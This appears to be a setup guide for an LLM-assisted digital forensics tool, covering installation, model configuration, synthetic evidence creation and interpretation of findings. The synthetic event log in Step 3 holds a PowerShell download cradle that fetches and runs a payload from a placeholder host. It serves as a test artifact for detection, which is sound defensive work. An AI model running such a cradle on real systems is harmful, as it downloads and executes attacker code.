# Try It Out — Geoff DFIR

Step-by-step guide to running Geoff against synthetic evidence on a fresh SIFT Workstation.
Estimated time: 20–40 minutes depending on model profile.

---

## Prerequisites

| Requirement | Notes |
|-------------|-------|
| **SIFT Workstation** | Ubuntu 22.04 (SIFT 2026.x). Download at https://www.sans.org/tools/sift-workstation/ |
| **Python 3.12+** | Included in SIFT. Verify: `python3 --version` |
| **Git** | `sudo apt-get install -y git` |
| **Internet access (first run)** | Self-heal installs missing tools on demand via `apt-get`. Subsequent runs on the same machine use already-installed tools. |
| **Ollama** | Installed automatically by `install.sh`. |
| **Ollama Cloud account** | Run `ollama signin` after installation — see Step 2. Not needed for local profile. |
| **Disk space** | Cloud profile: ~500 MB. Local profile: ~40 GB for model weights. |

---

## Step 1 — Clone and install

```bash
git clone https://github.com/legacyboy/Geoff.git
cd Geoff
chmod +x install.sh

# Cloud profile (recommended — no GPU needed, no large model downloads):
./install.sh --profile cloud

# Local profile (no internet during investigation, ~40 GB models):
./install.sh --profile local
```

The installer:
1. Installs `apt` dependencies (sleuthkit, tshark, bulk_extractor, yara, etc.)
2. Installs Python packages from `requirements.txt`
3. Installs Ollama if missing
4. Pulls model weights (local profile only)
5. Creates the `geoff-find-evil` command on your PATH

Verify:
```bash
which geoff-find-evil
geoff-find-evil --help
```

---

## Step 2 — Configure Ollama

**Cloud profile (recommended):**

```bash
# Ollama was installed by install.sh. Start it if not running:
sudo systemctl enable --now ollama

# Sign into Ollama Cloud (one-time):
ollama signin
# Enter your Ollama Cloud credentials when prompted.
# This authorizes the local Ollama service to pull and run cloud models.
# No API key needed in .env — the signin handles auth automatically.
```

**Cloud profile models** (used automatically when `GEOFF_PROFILE=cloud`):
- Manager: `deepseek-v4-flash:cloud`
- Forensicator: `qwen3-coder-next:cloud`
- Critic: `glm-5.1:cloud`

**Local profile (no internet required during investigation, ~40 GB models):**

```bash
curl -fsSL https://ollama.ai/install.sh | sh
ollama pull deepseek-r1:32b       # Manager
ollama pull qwen2.5-coder:14b     # Forensicator
ollama pull qwen2.5:14b           # Critic
ollama pull gemma4:31b             # Critic 2
```

---

## Step 3 — Create synthetic evidence

The repository does not ship evidence. Create a minimal synthetic set:

```bash
mkdir -p /tmp/synthetic_evidence/disk_images /tmp/synthetic_evidence/logs

# 1 MB FAT disk image (enough to exercise sleuthkit + file inventory)
dd if=/dev/zero bs=1M count=1 of=/tmp/synthetic_evidence/disk_images/test.raw 2>/dev/null
mkfs.fat /tmp/synthetic_evidence/disk_images/test.raw 2>/dev/null || true

# Synthetic Windows event log (text-format, exercises the log playbook)
cat > /tmp/synthetic_evidence/logs/security.evt.txt <<'EOF'
2026-05-01 10:23:14 EventID=4624 Account=TESTUSER LogonType=3 Source=192.168.1.100
2026-05-01 10:23:45 EventID=4688 Process=powershell.exe CommandLine="IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload')"
2026-05-01 10:24:01 EventID=4625 Account=Administrator FailureReason=BadPassword
2026-05-01 10:25:00 EventID=5145 Share=\\*\C$ Account=NETWORK_SERVICE AccessMask=0x3
EOF
```

---

## Step 4 — Configure

Copy `.env.example` to `.env` and edit:

```bash
cp .env.example .env
```

Minimum required settings:

```bash
# .env — edit this file
# Cloud profile (Ollama Cloud via local service):
OLLAMA_URL=http://localhost:11434
GEOFF_PROFILE=cloud
GEOFF_EVIDENCE_PATH=/mnt/evidence
GEOFF_CASES_PATH=/mnt/cases
# No OLLAMA_API_KEY needed — use `ollama signin` to authenticate

# Local profile (GPU models):
# OLLAMA_URL=http://localhost:11434
# GEOFF_PROFILE=local
# GEOFF_EVIDENCE_PATH=/mnt/evidence
# GEOFF_CASES_PATH=/mnt/cases
```

If you don't set `GEOFF_API_KEY`, the server runs unauthenticated (fine for local use).

---

## Step 5 — Run Find Evil

### Command line (fastest, no server required)

```bash
geoff-find-evil /tmp/synthetic_evidence
```

### Expected output

```
  Geoff DFIR — Find Evil
  Evidence: /tmp/synthetic_evidence

10:30:01  ▶ PB-SIFT-000: Triage Prioritization
10:30:02    Classification: Lateral Movement | Severity: HIGH
10:30:02    Manager approved 4 playbooks: PB-SIFT-001, PB-SIFT-002, PB-SIFT-003, PB-SIFT-005
10:30:03  ▶ PB-SIFT-001: Initial Access [synthetic_evidence]
10:30:04    ✓ fls_list_files — INFO
10:30:05  ▶ PB-SIFT-002: Execution [synthetic_evidence]
10:30:06    ✓ strings_extract — HIGH  (powershell IEX download cradle found)
10:30:07  ▶ PB-SIFT-003: Persistence [synthetic_evidence]
10:30:08    ✓ registry_run_keys — MEDIUM
10:30:09  ▶ PB-SIFT-005: Credential Access [synthetic_evidence]
10:30:10    ✓ evtx_logon_events — HIGH  (failed logon: Administrator)
10:30:11  Dual Critic validating (Critic A + Critic B in parallel)...
10:30:12  Batch Critic reviewing 4 playbooks...
10:30:13  Manager decision: APPROVE
10:30:14  Generating narrative report...

┌────────────────────────────────────────────────────────────┐
│           GEOFF FIND EVIL — INVESTIGATION COMPLETE         │
├────────────────────────────────────────────────────────────┤
│  Evil found:           YES                                 │
│  Classification:       Lateral Movement                    │
│  Severity:             HIGH                                │
│  Playbooks run:        4                                   │
│  Steps completed:      8  (0 failed)                       │
│  Elapsed:              14.2s                               │
│  MITRE techniques:     T1059, T1021, T1003                 │
│  Case directory:       /tmp/geoff-cases/synth-...          │
└────────────────────────────────────────────────────────────┘
```

**Tip:** Add `--json` to get machine-readable output, or `-o report.json` to save the report.

---

## Step 6 — Inspect the output artifacts

After the run, the case directory under `GEOFF_WORK_DIR` contains:

```
/tmp/geoff-cases/<case-id>/
├── findings.jsonl               ← one record per step
├── batch_critic_assessment.json ← Critic's holistic review
├── manager_decision.json        ← approve / flag / replay decision
├── provenance_dag.json          ← evidence derivation graph
├── confidence_scores.json       ← per-finding confidence (dual-critic)
├── audit_trail.jsonl            ← all state transitions
├── custody/
│   └── <step_key>.json          ← SHA-256 chain of custody per step
└── reports/
    └── narrative_report.md      ← LLM-written narrative (if approved)
```

Inspect findings:
```bash
jq . /tmp/geoff-cases/*/findings.jsonl | less
jq . /tmp/geoff-cases/*/batch_critic_assessment.json
jq . /tmp/geoff-cases/*/manager_decision.json
jq . /tmp/geoff-cases/*/provenance_dag.json
```

**New:** Check the IP map visualization:
```bash
# Start the web server
python src/geoff_integrated.py
# Then open: http://localhost:8080/reports/<case-dir>/ip-map
```

**New:** View MITRE ATT&CK matrix:
```bash
# Open: http://localhost:8080/reports/mitre-matrix
# Or heatmap: http://localhost:8080/reports/mitre-heatmap
```

See `docs/sample_logs/` for annotated examples of each artifact.

---

## Step 7 — Web UI (optional)

```bash
python src/geoff_integrated.py
# Open http://localhost:8080
```

Navigate to the **Find Evil** tab, enter `/tmp/synthetic_evidence`, and click **Run Find Evil**. Progress streams live in the browser.

---

## New Features to Explore

After your first run, try these newer capabilities:

### YARA Scanning (PB-SIFT-051)

```bash
# YARA runs automatically when disk images or memory dumps are found
# 5 built-in rules: Suspicious PE Overlay, Encoded PowerShell, Ransomware, Credential Dumping, Webshell
# Add custom rules by placing .yar files in /tmp/geoff_yara_rules/
```

### DNS Forensics (PB-SIFT-050)

```bash
# If you have PCAP files with DNS traffic:
# - DGA detection (Shannon entropy scoring)
# - DNS tunneling detection (high TXT record ratio, long subdomains)
# Runs automatically when PCAPs are present
```

### Hash Correlation + NSRL (PB-SIFT-052)

```bash
# Files are hashed (SHA-256, MD5, SHA1) automatically
# NSRL lookup identifies known operating system files
# Reduces false positives by filtering out standard Windows/system files
```

### IP Map Visualization

Open any completed case report and look for the **IP Map** tab or visit:
```
http://localhost:8080/reports/<case-dir>/ip-map
```

Interactive VisJS graph showing all network connections with color-coded node types (internal, external, multicast).

### Replay a Playbook

```bash
curl -X POST http://localhost:8080/replay-playbook \
  -H 'Content-Type: application/json' \
  -d '{
    "case_name": "my-case",
    "playbook_id": "PB-SIFT-001",
    "adjustments": {"offset": 2048}
  }'
```

---

## Known Limitations to Be Aware Of

### Tool auto-installation (self-heal)

Not all tools referenced by playbooks are installed by `install.sh`. When a tool is missing, the self-heal fast-path installs it automatically:

```
10:30:05  ✗ fls_list_files — tool not found: fls
10:30:05    Self-heal: installing sleuthkit via apt-get...
10:30:07    Retry: fls_list_files — SUCCESS
```

**This requires internet access on the first run.** Subsequent runs on the same machine skip the install. Tools that may be auto-installed:

| Tool | Package | Playbook(s) |
|------|---------|------------|
| `fls`, `mmls`, `icat` | `sleuthkit` | PB-SIFT-001, PB-SIFT-002 |
| `tshark` | `tshark` | PB-SIFT-011, PB-SIFT-036 |
| `bulk_extractor` | `bulk-extractor` | PB-SIFT-001, PB-SIFT-007 |
| `tcpflow` | `tcpflow` | PB-SIFT-019 |
| `foremost` | `foremost` | PB-SIFT-008 |
| `yara` | `yara` | PB-SIFT-051 |
| `vol` (Volatility3) | `pip: volatility3` | PB-SIFT-027 memory steps |

**Note:** `permission_error` failures are **not** auto-healed — they stop the step and mark it `needs_review`. Make sure Geoff can read your evidence directory:

```bash
ls -la /tmp/synthetic_evidence/
# All files should be readable by the user running geoff-find-evil
```

---

## Troubleshooting

### "Ollama connection refused"

Ollama is not running. Start it:

```bash
sudo systemctl start ollama
# Verify:
curl http://localhost:11434/api/tags
```

For cloud profile, verify you've run `ollama signin` and that `OLLAMA_URL` in `.env` is `http://localhost:11434`.

### "No evidence found" / empty investigation

Geoff scans for known evidence types (`.E01`, `.raw`, `.img`, `.evtx`, `.pcap`, `.hive`, etc.). Plain `.txt` files are not automatically ingested by the disk playbooks. Make sure your evidence directory has files with recognized extensions.

The synthetic `test.raw` created in Step 3 is a FAT image that sleuthkit can parse. The `security.evt.txt` is a text log — Geoff classifies it as a log file and the string extraction specialist will process it.

### Steps failing with "needs_review"

If LLM calls time out (cloud endpoint slow or local model not loaded), steps are marked `needs_review: true`. The investigation continues; the Critic's batch review will note the unverified count. Check:

```bash
jq 'select(.needs_review == true)' /tmp/geoff-cases/*/findings.jsonl
```

### Self-heal loop not stopping

The self-heal rate limiter allows at most 3 LLM calls per 60 seconds per `(module, function)` pair. If a step fails repeatedly, it will be marked failed after the rate limit is hit. This prevents runaway LLM usage.

### "manager_decision.json shows auto_approved: true"

This means the Manager LLM was unavailable and the pipeline defaulted to approve. The audit trail records `auto_approve_reason: "manager_llm_unavailable"`. Results are still valid; the Manager's reasoning is absent for this run.

### YARA not scanning

If `yara` binary is not found, PB-SIFT-051 reports `yara binary not found` and produces no matches. Install it:

```bash
sudo apt-get install -y yara
```

Or let the self-heal fast-path install it automatically on first run.

---

## Sample Evidence Datasets (Real Data)

For documented reproduction runs with real forensic datasets, see `docs/REPRODUCING_RESULTS.md`. It covers:
- M57-Patents (86 disk images, 89 GB)
- M57-JEAN-REAL (single EWF image)
- Hacking Case dataset
- Data Leakage case

Those datasets require downloading from their respective sources; follow the instructions in `REPRODUCING_RESULTS.md` for evidence provenance and expected output.